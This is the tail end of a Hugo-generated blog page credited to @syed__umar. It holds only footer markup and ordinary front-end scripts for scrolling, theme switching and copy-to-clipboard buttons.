20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2021 <a href=https://twitter.com/syed__umar target=_blank>@syed__umar</a></span>
<span>&#183;</span>
<span>Powered by <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>window.onload=function(){localStorage.getItem("menu-scroll-position")&&(document.getElementById('menu').scrollLeft=localStorage.getItem("menu-scroll-position"))};function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById('menu').scrollLeft)}document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script><script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script></body></html>